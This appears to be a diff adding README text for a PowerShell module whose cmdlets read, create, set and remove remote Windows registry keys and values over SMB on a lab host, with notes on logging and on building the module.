+Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\System\CurrentControlSet\Services\TestService -IncludeValues -IncludeData
+Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -IncludeSubkeys
+```
+
+#### New-TBORegKey
+
+Creates a remote registry key.
+
+```powershell
+New-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO
+```
+
+#### Remove-TBORegKey
+
+Removes a remote registry key.
+
+```powershell
+Remove-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO
+```
+
+#### Get-TBORegValue
+
+Gets values from a remote registry key.
+
+```powershell
+Get-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
+Get-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName
+```
+
+#### Set-TBORegValue
+
+Sets a remote registry value.
+
+```powershell
+Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name InstallId -Type String -Value "abc123"
+Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name Flags -Type DwordLE -Value 1
+```
+
+#### Remove-TBORegValue
+
+Removes a remote registry value.
+
+```powershell
+Remove-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name InstallId
+```
+
+## Local Logging
+
+Set `TITANIS_TBO_LOG` to `1` or to a file path. When set to `1`, logs go to
+`%TEMP%\Titanis.TBO.Smb2.log`.
+
+## Build
+
+```powershell
+# Dev build (fast local test loop).
+# Required when building from the TBO repo while referencing Titanis directly.
+dotnet build .\src\Titanis.TBO.Smb2.PowerShell.csproj -c Release /p:UseArtifactsOutput=false
+
+# Example: copy the built module folder for testing.
+# robocopy .\src\bin\Release\net8.0\ C:\Temp\Titanis.TBO.Smb2 /E
+
+# Bump the version (major|minor|patch) before commit.
+.\Build\Update-Version.ps1 -Bump patch
+
+# Release packaging with PSPublishModule (outputs to .\Artifacts\).
+# Requires: Install-Module -Name PSPublishModule -Scope CurrentUser
+.\Build\Build-Module.ps1 -Configuration Release
+
+# Skip tests if you need a quick packaging run (not recommended).
+# .\Build\Build-Module.ps1 -Configuration Release -SkipTests
+```
